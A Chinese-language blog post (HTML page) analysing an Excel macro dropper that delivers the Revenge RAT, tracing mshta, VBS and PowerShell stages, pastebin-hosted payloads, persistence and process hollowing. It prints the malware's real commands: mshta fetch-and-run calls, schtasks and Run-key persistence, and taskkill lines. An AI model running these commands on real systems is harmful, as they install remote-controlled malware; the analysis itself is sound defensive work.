@@ -1,0 +1,351 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>宏病毒_APT分析报告 | Azha0's Space</title><meta name="keywords" content="远控,宏病毒,奇兵计划,样本分析报告,APT,非PE脚本语言样本"><meta name="author" content="Azha0,A_zha0@163.com"><meta name="copyright" content="Azha0"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="该样本通过宏代码访问网址中的JS代码，调用mshta执行JS代码解析出的VBS代码。其中多重混淆，并且全程都是以无文件方式执行的，从指定URL上获取两端PE数据流，通过反射加载来创建傀儡进程执行远控程序，在一定程度上可以逃避杀软的查杀，可见该样本的执行过程十分隐蔽，技术手段高超。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="宏病毒_APT分析报告">
+<meta property="og:url" content="https://azha0.github.io/2019/10/10/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/05_%E6%97%A0%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0%E5%AE%8F%E7%97%85%E6%AF%92_APT/index.html">
+<meta property="og:site_name" content="Azha0&#39;s Space">
+<meta property="og:description" content="该样本通过宏代码访问网址中的JS代码，调用mshta执行JS代码解析出的VBS代码。其中多重混淆，并且全程都是以无文件方式执行的，从指定URL上获取两端PE数据流，通过反射加载来创建傀儡进程执行远控程序，在一定程度上可以逃避杀软的查杀，可见该样本的执行过程十分隐蔽，技术手段高超。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/BlogImg/myimg/postimg/APT.jpg">
+<meta property="article:published_time" content="2019-10-10T12:00:00.000Z">
+<meta property="article:modified_time" content="2021-06-07T15:34:21.939Z">
+<meta property="article:author" content="Azha0">
+<meta property="article:tag" content="远控">
+<meta property="article:tag" content="宏病毒">
+<meta property="article:tag" content="奇兵计划">
+<meta property="article:tag" content="样本分析报告">
+<meta property="article:tag" content="APT">
+<meta property="article:tag" content="非PE脚本语言样本">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/BlogImg/myimg/postimg/APT.jpg"><link rel="shortcut icon" href="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/BlogImg/myimg/favicon.png"><link rel="canonical" href="https://azha0.github.io/2019/10/10/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/05_%E6%97%A0%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0%E5%AE%8F%E7%97%85%E6%AF%92_APT/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: {"limitCount":50,"languages":{"author":"作者: Azha0","link":"链接: ","source":"来源: Azha0's Space","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
+  lightbox: 'fancybox',
+  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#121212","position":"bottom-left"},
+  source: {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+    },
+    fancybox: {
+      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = { 
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: undefined,
+  isToc: true,
+  postUpdate: '2021-06-07 23:34:21'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
+          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
+          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
+          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+
+          if (t === undefined) {
+            if (isLightMode) activateLightMode()
+            else if (isDarkMode) activateDarkMode()
+            else if (isNotSpecified || hasNoSupport) {
+              const now = new Date()
+              const hour = now.getHours()
+              const isNight = hour <= 6 || hour >= 18
+              isNight ? activateDarkMode() : activateLightMode()
+            }
+            window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
+              if (saveToLocal.get('theme') === undefined) {
+                e.matches ? activateDarkMode() : activateLightMode()
+              }
+            })
+          } else if (t === 'light') activateLightMode()
+          else activateDarkMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    })(window)</script><meta name="generator" content="Hexo 5.1.1"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting/BlogImg/myimg/avatar.png" onerror="onerror=null;src='https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/BlogImg/myimg/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">29</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">39</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/BlogImg/myimg/postimg/APT.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Azha0's Space</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">宏病毒_APT分析报告</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2019-10-10T12:00:00.000Z" title="发表于 2019-10-10 20:00:00">2019-10-10</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-06-07T15:34:21.939Z" title="更新于 2021-06-07 23:34:21">2021-06-07</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/">样本分析报告</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">2.5k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>8分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="宏病毒_APT分析报告"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><center><font size = 8><b>疑似APT宏病毒分析报告</b></font></center>
+
+
+
+<h1 id="0x00-概述"><a href="#0x00-概述" class="headerlink" title="0x00 概述"></a>0x00 概述</h1><h2 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h2><table>
+<thead>
+<tr>
+<th align="center">样本名称</th>
+<th align="center"><strong>Order__679873892.xls</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center"><strong>样本类型</strong></td>
+<td align="center"><strong>宏病毒、Revenge RAT远控木马</strong></td>
+</tr>
+<tr>
+<td align="center"><strong>样本大小</strong></td>
+<td align="center"><strong>40.5 KB (41,472 字节)</strong></td>
+</tr>
+<tr>
+<td align="center"><strong>MD5</strong></td>
+<td align="center"><strong>2A8A7254D6A2D75BC55F27F732C97DCC</strong></td>
+</tr>
+</tbody></table>
+<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><blockquote>
+<p>该样本最终实现执行一个远控程序，样本通过宏代码访问网址中的JS代码，调用mshta执行JS代码解析出的VBS代码。其中多重混淆，并且全程都是以无文件方式执行的，从指定URL上获取两端PE数据流，通过反射加载来创建傀儡进程执行远控程序，在一定程度上可以逃避杀软的查杀，可见该样本的执行过程十分隐蔽，技术手段高超。</p>
+</blockquote>
+<h2 id="流程图"><a href="#流程图" class="headerlink" title="流程图"></a>流程图</h2><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/05_%E5%AE%8F%E7%97%85%E6%AF%92_APT/05_%E5%AE%8F%E7%97%85%E6%AF%92.png" alt="05_宏病毒"></p>
+<h1 id="0x01-样本详细分析"><a href="#0x01-样本详细分析" class="headerlink" title="0x01 样本详细分析"></a>0x01 样本详细分析</h1><h2 id="查看宏"><a href="#查看宏" class="headerlink" title="查看宏"></a>查看宏</h2><p>该样本是一个Excel文件并且带有宏，首先查看宏代码，发现有密码，可以使用工具offkey获取密码来解密。</p>
+<p>查看宏代码，其中值得关注的便是函数<code>workbook_Open()</code>，Workbook_Open和Auto_Open差不多都能实现在打开office时自动运行。该函数中有明显的执行函数<code>shell()</code>，然后在shell处下断点，然后进行调试来查看所执行的指令。调试出来的指令如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;mshta http[:]&#x2F;&#x2F;bit.ly&#x2F;8hsshjahassahsh&quot;</span><br></pre></td></tr></table></figure>
+
+<p>通过执行mshta，去访问指定的域名。调试结果如下：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/05_%E5%AE%8F%E7%97%85%E6%AF%92_APT/1568959569555.png" alt="1568959569555"></p>
+<h2 id="异常JS代码"><a href="#异常JS代码" class="headerlink" title="异常JS代码"></a>异常JS代码</h2><p>访问指令中的域名，发现是一个正常的网页，然后将网页源码拷下来，发现该网页源码中，有一段异常的JS代码，其中使用了函数<code>document.write</code>。异常JS代码如图：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/05_%E5%AE%8F%E7%97%85%E6%AF%92_APT/1568986274183.png" alt="1568986274183"></p>
+<p>使用<code>console.log</code>解析异常JS代码，解析出来了一个VBS代码。也就说明了网页执行到该异常JS代码时，会通过执行<code>document.write</code>，将该VBS代码嵌在了网页文档中，所以==宏调用的mshta真正执行的其实就是这个VBS代码==。这里将其保存下来，并命名为1.vbs。解析出来的VBS代码，如图：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/05_%E5%AE%8F%E7%97%85%E6%AF%92_APT/1568986836029.png" alt="1568986836029"></p>
+<p>调试该VBS代码（1.vbs），发现该VBS再次调用了指令：<code>mshta</code>，去访问网址来执行操作。mshta指令为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mshta “http[:]&#x2F;&#x2F;www.pastebin.com&#x2F;raw&#x2F;nv5d9pYu&quot;</span><br></pre></td></tr></table></figure>
+
+<p>调试1.VBS结果如图所示：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/05_%E5%AE%8F%E7%97%85%E6%AF%92_APT/1569030736561.png" alt="1569030736561"></p>
+<h2 id="添加计划任务和开机自启"><a href="#添加计划任务和开机自启" class="headerlink" title="添加计划任务和开机自启"></a>添加计划任务和开机自启</h2><p>再去访问1.VBS执行指令中的网址，发现还是一个正常的网址，网址源码中含有异常JS代码。1.VBS所访问网址中的异常JS代码如下：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/05_%E5%AE%8F%E7%97%85%E6%AF%92_APT/1569036067621.png" alt="1569036067621"></p>
+<p>解析该JS代码，发现与上一步一模一样的，还是==解析出来VBS代码，交由mshta==去执行。该样本通过这样的手段，访问正常的网站，然后去执行隐藏在网页中的恶意代码，来隐藏自身的恶意行为，并且可以==实现无文本执行恶意行为==，来逃避查杀。解析出的VBS代码如下：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/05_%E5%AE%8F%E7%97%85%E6%AF%92_APT/1569036586575.png" alt="1569036586575"></p>
+<p>将调试出来的VBS代码保存下来，并命名为2.VBS。然后调试2.VBS，2.VBS主要行为如下：</p>
+<p>1.关闭进程，关闭Word、Excel、Publisher、PPT程序。关闭这些程序，目的可能是用来隐藏恶意程序的来源与 。 执行指令如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd.exe &#x2F;c taskkill &#x2F;f &#x2F;im winword.exe &amp; taskkill &#x2F;f &#x2F;im excel.exe &amp; taskkill &#x2F;f &#x2F;im MSPUB.exe &amp; taskkill &#x2F;f &#x2F;im POWERPNT.EXE &amp; exit</span><br></pre></td></tr></table></figure>
+
+<p>2.设置两个计划任务，分别为每60分钟和每300分钟调用一次mshta，并分别访问了两个不同的URL。而且还将计划任务的名字设置为与系统更新相关的内容。执行指令如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">schtasks &#x2F;create &#x2F;sc MINUTE &#x2F;mo 60 &#x2F;tn &quot;Windows Update&quot; &#x2F;tr &quot;mshta.exe http:&#x2F;&#x2F;pastebin.com&#x2F;raw&#x2F;vXpe74L2&quot; &#x2F;F</span><br><span class="line">schtasks &#x2F;create &#x2F;sc MINUTE &#x2F;mo 300 &#x2F;tn &quot;Update&quot; &#x2F;tr &quot;mshta.exe http:&#x2F;&#x2F;pastebin.com&#x2F;raw&#x2F;JdTuFmc5&quot; &#x2F;F</span><br></pre></td></tr></table></figure>
+
+<p>3.设置开机自启动项，修改注册表添加自启动项。致使每次开机便会执行mshta，访问指定URL。修改的注册表，及执行的指令如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;HKCU\Software\Microsoft\Windows\CurrentVersion\Run\AvastUpdate&quot;</span><br><span class="line">&quot;mshta.exe http:&#x2F;&#x2F;pastebin.com&#x2F;raw&#x2F;CGe3S2Vf&quot;,&quot;REG_EXPAND_SZ&quot;</span><br></pre></td></tr></table></figure>
+
+<p>调试2.VBS结果如图：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/05_%E5%AE%8F%E7%97%85%E6%AF%92_APT/1569043864988.png" alt="1569043864988"></p>
+<p>其中计划任务和开机自启项中，mshta访问的URL如下表：</p>
+<table>
+<thead>
+<tr>
+<th>访问的URL</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>http[:]//pastebin.com/raw/vXpe74L2</td>
+</tr>
+<tr>
+<td>http[:]//pastebin.com/raw/JdTuFmc5</td>
+</tr>
+<tr>
+<td>http[:]//pastebin.com/raw/CGe3S2Vf</td>
+</tr>
+</tbody></table>
+<h2 id="执行Powershell"><a href="#执行Powershell" class="headerlink" title="执行Powershell"></a>执行Powershell</h2><p>继续去访问这3个URL，发现这3个URL的内容都是一样的，可见所有的持久化攻击的目的都是一致的，如图：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/05_%E5%AE%8F%E7%97%85%E6%AF%92_APT/1569044804280.png" alt="1569044804280"></p>
+<p>这里还是与之前的套路是一样的，还是将JS解析后的VBS代码，==交由mshta去执行解析后vbs中的代码,来实现无文本攻击==。解析出的VBS代码结果如图：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/05_%E5%AE%8F%E7%97%85%E6%AF%92_APT/1569045476737.png" alt="1569045476737"></p>
+<p>将解析出来的VBS保存为3.VBS，然后调试该VBS代码，发现3.VBS执行了powershell指令，调试结果如下图：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/05_%E5%AE%8F%E7%97%85%E6%AF%92_APT/1569046502014.png" alt="1569046502014"></p>
+<p>查看<code>Powershell</code>的指令，发现powershell，将初始化的数据转为字符串并执行。这里通过调试来获取Powershell执行的数据，如图:</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/05_%E5%AE%8F%E7%97%85%E6%AF%92_APT/1569049413413.png" alt="1569049413413"></p>
+<h2 id="从网页获取文件数据"><a href="#从网页获取文件数据" class="headerlink" title="从网页获取文件数据"></a>从网页获取文件数据</h2><p>分析powershell执行的指令，首先通过<code>test-connection</code>不断尝试谷歌进行链接，来判断网络连接情况。</p>
+<p>然后调用<code>CallByName</code>执行<code>DownloadString</code>从执行下表中的两个链接中下载字符串，然后通过IEX执行下载后的指令。</p>
+<table>
+<thead>
+<tr>
+<th>下载字符串连接地址：</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>http[:]//pastebin.com/raw/wMG90xwi</td>
+</tr>
+<tr>
+<td>http[:]//pastebin.com/raw/W455MKAZ</td>
+</tr>
+</tbody></table>
+<p>代码如图:</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/05_%E5%AE%8F%E7%97%85%E6%AF%92_APT/1569059441086.png" alt="1569059441086"></p>
+<h3 id="1-获取DLL文件流"><a href="#1-获取DLL文件流" class="headerlink" title="1.获取DLL文件流"></a>1.获取DLL文件流</h3><p>访问第一个网址==wMG90xwi==，发现从该网址上下载下来的==powershell==指令与上一个差不多，都是将初始化的数据，然后执行。这里直接调试，并将调试的结果输出到7.txt中，如图：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/05_%E5%AE%8F%E7%97%85%E6%AF%92_APT/1569060163393.png" alt="1569060163393"></p>
+<p>查看生成的7.txt，发现又是一层执行。可以从中看出是一个==PE==文件，数据开头4D5A，而且该powershell执行的主要目的在于替换其中的数据，然后替换完数据，由通过load去加载替换后的比特流，初步推断替换后的是一个dll文件。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/05_%E5%AE%8F%E7%97%85%E6%AF%92_APT/1569065604284.png" alt="1569065604284"></p>
+<p>通过将<code>IEX</code>替换为<code>out-file</code>, 获取这个PE文件。通过==DIE==查看该PE文件，发现该PE文件正如猜想为一个dll文件，这也就说明了，这里通过==函数<code>load</code>加载了一个从网上获取到的dll文件的数据流==，依旧还是无文本模式。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/05_%E5%AE%8F%E7%97%85%E6%AF%92_APT/1569066094943.png" alt="1569066094943"></p>
+<h3 id="2-获取exe文件流"><a href="#2-获取exe文件流" class="headerlink" title="2.获取exe文件流"></a>2.获取exe文件流</h3><p>访问第二个网址==W455MKAZ==，发现这次从该网址上下载的字符串直接是一个PE文件的数据流，如图：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/05_%E5%AE%8F%E7%97%85%E6%AF%92_APT/1569066429620.png" alt="1569066429620"></p>
+<p>这里将其转换为二进制粘贴到文件中，就能获得该文件。用==DIE==查该文件，发现是一个.Net编写的exe文件。如图：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/05_%E5%AE%8F%E7%97%85%E6%AF%92_APT/1569066582960.png" alt="1569066582960"></p>
+<p>上面两步获取的文件流，并没有保存到本地，而是以比特流的形式存储的。这样的目的是不生成文件，很大程度上能做到免杀。</p>
+<h2 id="反射动态加载"><a href="#反射动态加载" class="headerlink" title="反射动态加载"></a>反射动态加载</h2><p>获取完EXE和DLL文件流之后，该样本通过==反射加载==，加载了该DLL。执行了该DLL中的==retrt477fdg145fd4g0wewerwedsa799221dsad4154qwe==方法，并将<code>（&quot;MSBuild.exe&quot;，$f）</code>作为参数传入该方法中，其中$f为获取到的EXE的二进制文件流数据。如图：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/05_%E5%AE%8F%E7%97%85%E6%AF%92_APT/1569068224763.png" alt="1569068224763"></p>
+<h2 id="创建傀儡进程"><a href="#创建傀儡进程" class="headerlink" title="创建傀儡进程"></a>创建傀儡进程</h2><p>该样本通过反射加载了DLL文件中的函数==retrt477fdg145fd4g0wewerwedsa799221dsad4154qwe==，并传进了两个参数，一个是字符串<code>&quot;MSBuild.exe&quot;</code>，一个exe文件的比特流数组。查看该函数对这两个参数或这个函数干了些什么。</p>
+<h3 id="1-解混淆"><a href="#1-解混淆" class="headerlink" title="1.解混淆"></a>1.解混淆</h3><p>通过反编译工具==dnspy==，查看该.Net编写的dll文件时，发现其中有大量的混淆内容，查看编辑模块中的自定义特性发现该DLL文件是通过<code>ConfuserEx</code>混淆过的。如图：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/05_%E5%AE%8F%E7%97%85%E6%AF%92_APT/1569069138757.png" alt="1569069138757"></p>
+<p>可以通过该混淆制作者公布的工具，进行解混淆。并找到反射加载的函数，还发现该DLL文件中，有一些创建傀儡进程会用到的API，如图：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/05_%E5%AE%8F%E7%97%85%E6%AF%92_APT/1569069784184.png" alt="1569069784184"></p>
+<h3 id="2-创建进程并写入数据"><a href="#2-创建进程并写入数据" class="headerlink" title="2.创建进程并写入数据"></a>2.创建进程并写入数据</h3><p>从反射加载的函数，往下跟，发现函数<code>semthod_0</code>,创建进程MSBuild，并将其挂起，如图：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/05_%E5%AE%8F%E7%97%85%E6%AF%92_APT/1569070252322.png" alt="1569070252322"></p>
+<p>然后，该函数还往该进程内存中写入获取到的EXE文件的数据流，如图：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/05_%E5%AE%8F%E7%97%85%E6%AF%92_APT/1569070459004.png" alt="1569070459004"></p>
+<p>通过执行函数<code>ResumeThread</code>恢复线程，执行EXE文件，完成傀儡进程。如图：</p>
